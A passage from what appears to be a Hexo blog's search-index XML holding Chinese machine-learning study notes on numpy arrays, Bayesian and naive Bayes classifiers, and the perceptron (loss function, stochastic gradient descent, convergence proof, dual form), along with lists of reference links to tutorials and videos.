number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>       <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> barray<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>       <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>       <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span></code></pre><blockquote><p>numpy.ndarray.T</p></blockquote><p>返回转置数组</p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">.</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">.</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> xarray<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">,</span>       <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">.</span>Tarray<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">,</span>       <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> numpy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习数学知识</title>
      <link href="/2022/09/29/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%95%B0%E5%AD%A6%E7%9F%A5%E8%AF%86/"/>
      <url>/2022/09/29/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%95%B0%E5%AD%A6%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> 数学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习:SVM</title>
      <link href="/2022/09/29/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-SVM/"/>
      <url>/2022/09/29/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-SVM/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习:视频参考链接</title>
      <link href="/2022/09/29/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E8%A7%86%E9%A2%91%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5/"/>
      <url>/2022/09/29/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E8%A7%86%E9%A2%91%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="视频讲解"><a href="#视频讲解" class="headerlink" title="视频讲解"></a>视频讲解</h1><h1 id="机器学习参考链接"><a href="#机器学习参考链接" class="headerlink" title="机器学习参考链接"></a>机器学习参考链接</h1><p><a href="https://www.cnblogs.com/huangyc/p/9706575.html#_label3_0">1. 感知机原理（Perceptron） - hyc339408769 - 博客园 (cnblogs.com)</a></p><p><a href="https://www.cnblogs.com/BlairGrowing/p/14791795.html">机器学习——感知机 - 关注我更新论文解读 - 博客园 (cnblogs.com)</a></p><h2 id="机器学习参考视频"><a href="#机器学习参考视频" class="headerlink" title="机器学习参考视频"></a>机器学习参考视频</h2><p><a href="https://www.bilibili.com/video/BV14r4y1w74w/?spm_id_from=333.337.search-card.all.click&vd_source=5e8f069711510b3788382a0a03ff38e5">第二章 感知机_哔哩哔哩_bilibili</a></p><p><a href="https://space.bilibili.com/392379951/channel/seriesdetail?sid=272206">nanjixiong890的个人空间_哔哩哔哩_bilibili</a></p><h2 id="线性回归"><a href="#线性回归" class="headerlink" title="线性回归"></a>线性回归</h2><p><a href="https://www.bilibili.com/video/BV1RL411T7mT/?spm_id_from=333.788&vd_source=5e8f069711510b3788382a0a03ff38e5">【线性回归、代价函数、损失函数】动画讲解_哔哩哔哩_bilibili</a></p><p><a href="https://www.bilibili.com/video/BV18P4y1j7uH/?spm_id_from=333.788&vd_source=5e8f069711510b3788382a0a03ff38e5">【梯度下降】3D可视化讲解通俗易懂_哔哩哔哩_bilibili</a></p><h2 id="SVM"><a href="#SVM" class="headerlink" title="SVM"></a>SVM</h2><p>[<a href="https://www.bilibili.com/video/BV1vv4y1g721/?spm_id_from=333.788.recommend_more_video.6&vd_source=5e8f069711510b3788382a0a03ff38e5">5分钟学算法] #05 支持向量机 软硬通吃分类大法_哔哩哔哩_bilibili</a></p><p><a href="https://www.bilibili.com/video/BV16T4y1y7qj/?spm_id_from=333.788.recommend_more_video.12&vd_source=5e8f069711510b3788382a0a03ff38e5">【数之道】支持向量机SVM是什么，八分钟直觉理解其本质_哔哩哔哩_bilibili</a></p><p><a href="https://www.bilibili.com/video/BV13r4y1z7AG/?spm_id_from=333.788&vd_source=5e8f069711510b3788382a0a03ff38e5">【数之道25】机器学习必经之路-SVM支持向量机的数学精华_哔哩哔哩_bilibili</a></p><p><a href="https://www.bilibili.com/video/BV1Nb4y1s7pE/?spm_id_from=333.788&vd_source=5e8f069711510b3788382a0a03ff38e5">【数之道26】SVM支持向量机-核技巧Kernel Trick详解(多项式核函数，无限维度高斯核函数）_哔哩哔哩_bilibili</a></p><p><a href="https://www.bilibili.com/video/BV1AS4y1K7Jf/?spm_id_from=333.788&vd_source=5e8f069711510b3788382a0a03ff38e5">【数之道27】详解SVM支持向量机软间隔数学思想_哔哩哔哩_bilibili</a></p><p><a href="https://www.bilibili.com/video/BV1xB4y127cs/?spm_id_from=333.788&vd_source=5e8f069711510b3788382a0a03ff38e5">【数之道28】支持向量机SVM最终章-R语言实例分享_哔哩哔哩_bilibili</a></p><h2 id="神经网络"><a href="#神经网络" class="headerlink" title="神经网络"></a>神经网络</h2><p><a href="https://www.bilibili.com/video/BV1Yo4y1k7yU/?spm_id_from=333.788.recommend_more_video.2&vd_source=5e8f069711510b3788382a0a03ff38e5">“神经网络”是什么？如何直观理解它的能力极限？它是如何无限逼近真理的？_哔哩哔哩_bilibili</a></p><p><a href="https://www.bilibili.com/video/BV1uB4y1M7Ju/?spm_id_from=333.337.search-card.all.click&vd_source=5e8f069711510b3788382a0a03ff38e5">什么是“感知机”，它的缺陷为什么让“神经网络”陷入低潮_哔哩哔哩_bilibili</a></p><p><a href="https://www.bilibili.com/video/BV1FP411j7oW/?spm_id_from=333.788.recommend_more_video.2">学习分享一年，对神经网络的理解全都在这40分钟里了_哔哩哔哩_bilibili</a></p><p><a href="https://www.bilibili.com/video/BV1PS4y1w7nZ/?spm_id_from=333.788.recommend_more_video.9&vd_source=5e8f069711510b3788382a0a03ff38e5">【超详细讲解】看完秒懂什么是神经网络！_哔哩哔哩_bilibili</a></p><h2 id="拉格朗日和对偶"><a href="#拉格朗日和对偶" class="headerlink" title="拉格朗日和对偶"></a>拉格朗日和对偶</h2><p>拉格朗日乘数法 拉格朗日对偶问题 凸集 凸函数、凹函数 凸优化 弱对偶、强对偶 KKT条件 Slater条件 最大熵</p><p><a href="https://www.bilibili.com/video/BV1HP4y1Y79e/?spm_id_from=333.337.search-card.all.click&vd_source=5e8f069711510b3788382a0a03ff38e5">“拉格朗日对偶问题”如何直观理解？“KKT条件” “Slater条件” “凸优化”打包理解_哔哩哔哩_bilibili</a></p><p><a href="https://zhuanlan.zhihu.com/p/114574438">https://zhuanlan.zhihu.com/p/114574438</a><br><a href="https://blog.csdn.net/qq_34564612/article/details/79974635">https://blog.csdn.net/qq_34564612/article/details/79974635</a><br><a href="https://www.zhihu.com/question/58584814/answer/2182300318">https://www.zhihu.com/question/58584814/answer/2182300318</a><br><a href="http://cbio.ensmp.fr/~jvert/teaching/2006insead/slides/4_duality/duality.pdf">http://cbio.ensmp.fr/~jvert/teaching/2006insead/slides/4_duality/duality.pdf</a><br><a href="http://aandds.com/blog/dual-problem.html">http://aandds.com/blog/dual-problem.html</a><br><a href="https://www.cnblogs.com/90zeng/p/Lagrange_duality.html">https://www.cnblogs.com/90zeng/p/Lagrange_duality.html</a><br><a href="https://www.cnblogs.com/gczr/p/10521551.html">https://www.cnblogs.com/gczr/p/10521551.html</a></p><h2 id="凸优化"><a href="#凸优化" class="headerlink" title="凸优化"></a>凸优化</h2><p><a href="https://www.bilibili.com/video/BV1Cb4y1e7SZ/?spm_id_from=pageDriver&vd_source=5e8f069711510b3788382a0a03ff38e5">凸优化（二）：直观理解拉格朗日乘子法_哔哩哔哩_bilibili</a></p><h2 id="公式推导"><a href="#公式推导" class="headerlink" title="公式推导"></a>公式推导</h2><p><a href="https://www.bilibili.com/video/BV1aE411o7qd/?spm_id_from=333.788.recommend_more_video.0&vd_source=5e8f069711510b3788382a0a03ff38e5">【机器学习】【白板推导系列】【合集 1～33】_哔哩哔哩_bilibili</a></p><p><a href="https://www.bilibili.com/video/BV1No4y1o7ac/?spm_id_from=333.788.recommend_more_video.1">【合集】十分钟 机器学习 系列视频 《统计学习方法》_哔哩哔哩_bilibili</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习:贝叶斯</title>
      <link href="/2022/09/29/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E8%B4%9D%E5%8F%B6%E6%96%AF/"/>
      <url>/2022/09/29/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E8%B4%9D%E5%8F%B6%E6%96%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="贝叶斯分类器"><a href="#贝叶斯分类器" class="headerlink" title="贝叶斯分类器"></a>贝叶斯分类器</h1><h2 id="贝叶斯判定准则"><a href="#贝叶斯判定准则" class="headerlink" title="贝叶斯判定准则"></a>贝叶斯判定准则</h2><blockquote><p><strong>1.前提条件</strong></p></blockquote><p><strong>所有相关概率都已知</strong></p><blockquote><p><strong>2.条件风险</strong></p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929113912.png" alt="image-20220929113912708"></p><blockquote><p>3.<strong>贝叶斯判定准则</strong></p></blockquote><p>寻找一个判定准则最小化所有样本的条件风险总和。</p><p><strong>贝叶斯判定准则</strong>（Bayes decision rule）:为最小化总体风险，只需在每个样本上选择那个使得条件风险最小的类标。</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220925164322.png" alt="image-20220925164322637"></p><blockquote><p><strong>4.贝叶斯最优分类器</strong></p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220925164454.png" alt="image-20220925164453960"></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220925164426.png" alt="image-20220925164426053"></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929113945.png" alt="image-20220929113945769"></p><h2 id="先验知识概率论"><a href="#先验知识概率论" class="headerlink" title="先验知识概率论"></a>先验知识概率论</h2><blockquote><p><strong>1.乘法公式</strong></p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929114011.png" alt="image-20220929114011112"></p><blockquote><p><strong>2.条件概率</strong></p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929114036.png" alt="image-20220929114036205"></p><blockquote><p><strong>3.全概率公式</strong></p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929114047.png" alt="image-20220929114047454"></p><blockquote><p><strong>4.贝叶斯公式</strong></p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929114102.png" alt="image-20220929114102866"></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929114116.png" alt="image-20220929114116017"></p><blockquote><p><strong>5.常用术语</strong></p></blockquote><p>①先验概率：通过经验来判断事情发生的概率,X的先验概率表示为P(X)，Y的先验概率表示为P(Y)。</p><p>②后验概率：后验概率就是发生结果之后，推测原因的概率。</p><p>③条件概率：事件 A 在另外一个事件 B 已经发生条件下的发生概率，表示为 P(A|B)，读作“在 B 发生的条件下 A 发生的概率”。</p><p>版权声明：本文为CSDN博主「猫猫爱吃小鱼」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/cangzhexingxing/article/details/124200619">https://blog.csdn.net/cangzhexingxing/article/details/124200619</a></p><p>参考链接：<a href="https://www.bilibili.com/video/BV1a4411B7B4/?spm_id_from=autoNext&vd_source=5e8f069711510b3788382a0a03ff38e5">「一个模型」教你搞定贝叶斯和全概率公式_哔哩哔哩_bilibili</a></p><h2 id="朴素贝叶斯"><a href="#朴素贝叶斯" class="headerlink" title="朴素贝叶斯"></a>朴素贝叶斯</h2><blockquote><p><strong>1.由来</strong></p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220925165402.png" alt="image-20220925165402167"></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220925165420.png" alt="image-20220925165420288"></p><blockquote><p><strong>2.朴素贝叶斯推导</strong></p></blockquote><p><strong>前提所有属性相互独立</strong></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929114129.png" alt="image-20220929114129347"></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220925170208.png" alt="image-20220925170208798"></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220925170423.png" alt="image-20220925170423218"></p><p>参考链接：<a href="https://www.cnblogs.com/lliuye/p/9178090.html">朴素贝叶斯算法的理解与实现 - EEEEEcho - 博客园 (cnblogs.com)</a></p><blockquote><p><strong>3.朴素贝叶斯过程</strong></p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220925171150.png" alt="image-20220925171150384"></p><p>参考链接：<a href="https://www.cnblogs.com/phoenixzq/p/3539619.html">贝叶斯分类 - PhoenixZq - 博客园 (cnblogs.com)</a></p><blockquote><p><strong>4.朴素贝叶斯例子</strong></p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220925171654.png" alt="image-20220925171654226"></p><blockquote><p><strong>5.拉普拉斯平滑</strong></p></blockquote><p><strong>若某个属性值在训练集中和某个类别没有一起出现过，这样会抹掉其它的属性信息，因为该样本的类条件概率被计算为0。因此在估计概率值时，常常用进行平滑（smoothing）处理，拉普拉斯修正（Laplacian correction</strong>）</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220925171842.png" alt="image-20220925171842189"></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220925171856.png" alt="image-20220925171856442"></p><p>参考博客：</p><p><a href="https://blog.csdn.net/cangzhexingxing/article/details/124200619">(18条消息) 机器学习——朴素贝叶斯分类_猫猫爱吃小鱼的博客-CSDN博客_机器学习 贝叶斯分类</a></p><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV1up4y147Fs/?spm_id_from=trigger_reload&vd_source=5e8f069711510b3788382a0a03ff38e5">朴素贝叶斯分类器（上）浙工大_哔哩哔哩_bilibili</a></p><p><a href="https://www.bilibili.com/video/BV1hy4y1p7D3/?spm_id_from=333.999.0.0&vd_source=5e8f069711510b3788382a0a03ff38e5">朴素贝叶斯分类器（中） 浙工大_哔哩哔哩_bilibili</a></p><p><a href="https://www.bilibili.com/video/BV13f4y1W75P/?spm_id_from=333.999.0.0&vd_source=5e8f069711510b3788382a0a03ff38e5">朴素贝叶斯分类器（下）_哔哩哔哩_bilibili</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习:感知机</title>
      <link href="/2022/09/28/%E6%84%9F%E7%9F%A5%E6%9C%BA/"/>
      <url>/2022/09/28/%E6%84%9F%E7%9F%A5%E6%9C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="机器学习-感知机"><a href="#机器学习-感知机" class="headerlink" title="机器学习:感知机"></a>机器学习:感知机</h1><h2 id="1-感知机模型"><a href="#1-感知机模型" class="headerlink" title="1 感知机模型"></a>1 感知机模型</h2><h3 id="1-1-介绍"><a href="#1-1-介绍" class="headerlink" title="1.1 介绍"></a>1.1 介绍</h3><p>感知机是<a href="https://so.csdn.net/so/search?q=%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C&spm=1001.2101.3001.7020">神经网络</a>（深度学习）的起源的算法同时也是“<strong>支持向量机</strong>”的基础。<strong>感知机接受多个输入信号</strong>，<strong>输出一个信号</strong>。</p><p>感知机(perceptron)是==<strong>二类分类</strong>==的==<strong>线性分类模型</strong>==，其输入为实例的特征向量，输出为实例的类别。</p><p>==感知机将特征空间中的实例划分为正负两类，属于判别模型==</p><h3 id="1-2线性可分和线性不可分"><a href="#1-2线性可分和线性不可分" class="headerlink" title="1.2线性可分和线性不可分"></a>1.2线性可分和线性不可分</h3><p>​       线性可分指的是可以用一个<strong>线性函数</strong>将两类样本分开（注意这里是线性函数）,<strong>比如在二维空间中的直线，三位空间中的平面以及高维空间中的超平面</strong>。这里指的<strong>可分是没有一丝误差的分开</strong>，线性不可分指的就是部分样本用线性分类面划分时会产生分类错误的现象。</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220927135728.png" alt="image-20220927135728540"></p><h3 id="1-3感知机结构"><a href="#1-3感知机结构" class="headerlink" title="1.3感知机结构"></a>1.3感知机结构</h3><blockquote><p>M-p神经元结构</p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220927212843.png" alt="image-20220927212843886"></p><blockquote><p>感知机结构</p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220926095204.png" alt="image-20220926095204530"></p><h3 id="4感知机定义"><a href="#4感知机定义" class="headerlink" title="4感知机定义"></a>4感知机定义</h3><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220926095233.png" alt="image-20220926095233908"></p><h3 id="1-5几何解释"><a href="#1-5几何解释" class="headerlink" title="1.5几何解释"></a>1.5几何解释</h3><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220926100636.png" alt="image-20220926100636228"></p><blockquote><p>感知机分类过程</p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220927140334.gif" alt="g"></p><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV1C7411T79U/?spm_id_from=333.999.0.0&vd_source=5e8f069711510b3788382a0a03ff38e5">第2章 感知机-1_哔哩哔哩_bilibili</a></p><p><a href="https://blog.csdn.net/weixin_39591031/article/details/124636027">(18条消息) 什么是感知机（超详细 | 图文）_Xav Zewen的博客-CSDN博客_感知机</a></p><h2 id="2-感知机学习策略"><a href="#2-感知机学习策略" class="headerlink" title="2.感知机学习策略"></a>2.感知机学习策略</h2><h3 id="2-1学习策略"><a href="#2-1学习策略" class="headerlink" title="2.1学习策略"></a>2.1学习策略</h3><p>==损失函数代表的是模型对一个数据集的预测与该数据集的真实值之间的差距==，显然，差距越大，说明模型预测越不准确，我们需要一个预测准确的模型，所以我们需要让这样的差距最小，即最小化损失函数。即<strong>学习策略定义经验损失函数并将其最小化</strong></p><h3 id="2-2-基于误分类点数量的策略"><a href="#2-2-基于误分类点数量的策略" class="headerlink" title="2.2 基于误分类点数量的策略"></a>2.2 基于误分类点数量的策略</h3><p>​       首先 损失函数我们会容易想到采用 <strong>误分类点数量</strong> 作为损失函数：因为误分类点数量在我们的不断优化下会越来越少，我们只需要通过算法讲误分类数量优化到0 ，自然得到最优模型但是这样的<strong>损失函数并不是W，b连续可导</strong>（<strong>无法用函数形式表达出误分类大的个数</strong>）无法优化。</p><h3 id="2-3-基于误分类点总距离的策略"><a href="#2-3-基于误分类点总距离的策略" class="headerlink" title="2.3 基于误分类点总距离的策略"></a>2.3 基于误分类点总距离的策略</h3><p>思想源于数学中点到直线Ax+By+C=0公式。</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220927142226.png" alt="image-20220927142226122"></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220927112626.png" alt="image-20220927112626832"></p><blockquote><p>损失函数公式推导</p></blockquote><p><strong>假设训练数据集==线性可分==，感知机学习的目标是求得能够将训练集正负样本  通过超平面完全分开</strong></p><p><strong>==感知机损失函数为误分类点到超平面的总距离==：损失函数越小，说明被误分类的点到超平面的距离较近，且被误分类点较少，如果损失函数为0，说明没有误分类点</strong></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220926125839.png" alt="image-20220926125839659"></p><blockquote><p>==<strong>注意事项1/||w||去掉的原因</strong>==</p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220927143009.png" alt="image-20220927143009296"></p><p>参考链接：</p><p><a href="https://www.cnblogs.com/BlairGrowing/p/14791795.html">机器学习——感知机 - 关注我更新论文解读 - 博客园 (cnblogs.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/213772724?utm_source=wechat_session">感知机模型(Perceptron)详细解读 | 统计学习方法学习笔记 | 数据分析 | 机器学习 - 知乎 (zhihu.com)</a></p><p><a href="https://blog.csdn.net/weixin_44177594/article/details/120628925">(18条消息) 各种范式，F范式，l0范式，l1范式，l2范式_小葵向前冲的博客-CSDN博客_l2范式</a></p><p><a href="https://www.bilibili.com/video/BV1RL411T7mT/?spm_id_from=333.788&vd_source=5e8f069711510b3788382a0a03ff38e5">【线性回归、代价函数、损失函数】动画讲解_哔哩哔哩_bilibili</a></p><h2 id="3-感知机学习算法"><a href="#3-感知机学习算法" class="headerlink" title="3.感知机学习算法"></a>3.感知机学习算法</h2><p>　　 感知机学习算法是对上述损失函数进行极小化，求得 w 和 b。用普通的<strong>基于所有样本的梯度和的均值的批量梯度下降法（BGD）是行不通的</strong>，原因在于<strong>我们的损失函数里面有限定，只有误分类的 M 集合里面的样本才能参与损失函数的优化</strong>。所以我们不能用最普通的批量梯度下降，只能采用<strong>随机梯度下降</strong>（SGD）<strong>每次选择一个样本更新</strong>。</p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220927211022.png" alt="image-20220927211022140"></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220927125903.png" alt="image-20220927125903790"></p><p>随机梯度下降法：</p><p><a href="https://www.bilibili.com/video/BV1sE41157hy/?spm_id_from=333.788.recommend_more_video.1&vd_source=5e8f069711510b3788382a0a03ff38e5">感知机推导_哔哩哔哩_bilibili</a></p><p><a href="https://blog.csdn.net/qq_38150441/article/details/80533891">(18条消息) 机器学习：随机梯度下降法_会飞的小罐子的博客-CSDN博客_随机梯度下降</a></p><p>参考链接</p><p>[(18条消息) <a href="https://blog.csdn.net/walilk/article/details/50978864">机器学习] ML重要概念：梯度（Gradient）与梯度下降法（Gradient Descent）_WangBo_NLPR的博客-CSDN博客_梯度</a></p><p><a href="https://zhuanlan.zhihu.com/p/24913912">为什么梯度反方向是函数值局部下降最快的方向？ - 知乎 (zhihu.com)</a><a href="https://www.bilibili.com/video/BV18P4y1j7uH/?spm_id_from=333.788&vd_source=5e8f069711510b3788382a0a03ff38e5">【梯度下降】3D可视化讲解通俗易懂_哔哩哔哩_bilibili</a></p><blockquote><p>算法步骤</p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220926134617.png" alt="image-20220926134617073"></p><p>参考链接：</p><p><a href="https://zhuanlan.zhihu.com/p/257211949">感知机模型python复现 - 随机梯度下降法；梯度下降法；adagrad；对偶形式 - 知乎 (zhihu.com)</a></p><blockquote><p>感知机算法例子</p></blockquote><p><a href="https://www.bilibili.com/video/BV1Xb4y1H7tn/?spm_id_from=333.788&vd_source=5e8f069711510b3788382a0a03ff38e5">1.4 以实例的方式清晰过一遍感知机的训练全过程（包括前向推理，梯度下降，优化参数），真不信你听不懂！【AI蜗牛车】_哔哩哔哩_bilibili</a></p><h2 id="4-感知机收敛性-Novikoff定理证明"><a href="#4-感知机收敛性-Novikoff定理证明" class="headerlink" title="4.感知机收敛性 Novikoff定理证明"></a>4.感知机收敛性 <strong>Novikoff</strong>定理证明</h2><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220927093223.png" alt="image-20220927093216503"></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220927094742.png" alt="image-20220927094741913"></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220927134801.png" alt="image-20220927134801135"></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929170732.png" alt="image-20220929170732536"></p><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV197411T7i6/?p=2&vd_source=5e8f069711510b3788382a0a03ff38e5">第2章 感知机-3_哔哩哔哩_bilibili</a></p><h2 id="5-感知机对偶形式"><a href="#5-感知机对偶形式" class="headerlink" title="5.感知机对偶形式"></a>5.感知机对偶形式</h2><h3 id="1-对偶形式基本思想"><a href="#1-对偶形式基本思想" class="headerlink" title="1.对偶形式基本思想"></a>1.对偶形式基本思想</h3><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220927150851.png" alt="image-20220927150851748"></p><h3 id="2-对偶形式-步骤"><a href="#2-对偶形式-步骤" class="headerlink" title="2.对偶形式 步骤"></a>2.对偶形式 步骤</h3><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929170704.png" alt="image-20220929170657166"></p><h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h2><h3 id="1-原始和对偶形式选择"><a href="#1-原始和对偶形式选择" class="headerlink" title="1.原始和对偶形式选择"></a>1.原始和对偶形式选择</h3><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929171752.png" alt="image-20220929171751937"></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220929171813.png" alt="image-20220929171813385"></p><ul><li>在向量维数（特征数）过高时，计算内积非常耗时，应选择对偶形式算法加速。</li><li>在向量个数（样本数）过多时，每次计算累计和就没有必要，应选择原始算法</li></ul><p>参考链接：<a href="https://zhuanlan.zhihu.com/p/25880406">《浅析感知机（三）–收敛性证明与对偶形式以及python代码讲解》 - 知乎 (zhihu.com)</a></p><h3 id="2-感知机是其他算法鼻祖"><a href="#2-感知机是其他算法鼻祖" class="headerlink" title="2.感知机是其他算法鼻祖"></a>2.感知机是其他算法鼻祖</h3><p>感知机算法是一个简单易懂的算法，前面提到它是很多算法的鼻祖，比如<strong>支持向量机算法，神经网络与深度学习</strong>。因此虽然它现在已经不是一个在实践中广泛运用的算法，还是值得好好的去研究一下。<strong>感知机算法对偶形式为什么在实际运用中比原始形式快，也值得好好去体</strong>会。</p><h2 id="7-重点参考链接"><a href="#7-重点参考链接" class="headerlink" title="7.重点参考链接"></a>7.重点参考链接</h2><p>博客：</p><p><a href="https://www.cnblogs.com/BlairGrowing/p/14791795.html">机器学习——感知机 - 关注我更新论文解读 - 博客园 (cnblogs.com)</a></p><p><a href="https://www.cnblogs.com/huangyc/p/9706575.html">1. 感知机原理（Perceptron） - hyc339408769 - 博客园 (cnblogs.com)</a></p><p>视频：</p><p><a href="https://www.bilibili.com/video/BV197411T7i6/?p=2&vd_source=5e8f069711510b3788382a0a03ff38e5">第2章 感知机-3_哔哩哔哩_bilibili</a></p><p><a href="https://zhuanlan.zhihu.com/p/24913912">为什么梯度反方向是函数值局部下降最快的方向？ - 知乎 (zhihu.com)</a><a href="https://www.bilibili.com/video/BV18P4y1j7uH/?spm_id_from=333.788&vd_source=5e8f069711510b3788382a0a03ff38e5">【梯度下降】3D可视化讲解通俗易懂_哔哩哔哩_bilibili</a></p><p><a href="https://www.bilibili.com/video/BV14r4y1w74w/?spm_id_from=333.337.search-card.all.click&vd_source=5e8f069711510b3788382a0a03ff38e5">第二章 感知机_哔哩哔哩_bilibili</a></p><p>书籍：</p><p><strong>李航统计学习方法第二版</strong></p><h2 id="8-小思考"><a href="#8-小思考" class="headerlink" title="8.小思考"></a>8.小思考</h2><p>感知机中对偶形式和SVM中的对偶形式有什么区别？</p>]]></content>
      
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习:梯度下降算法</title>
      <link href="/2022/09/27/%E6%A2%AF%E5%BA%A6%E4%B8%8B%E9%99%8D%E7%AE%97%E6%B3%95/"/>
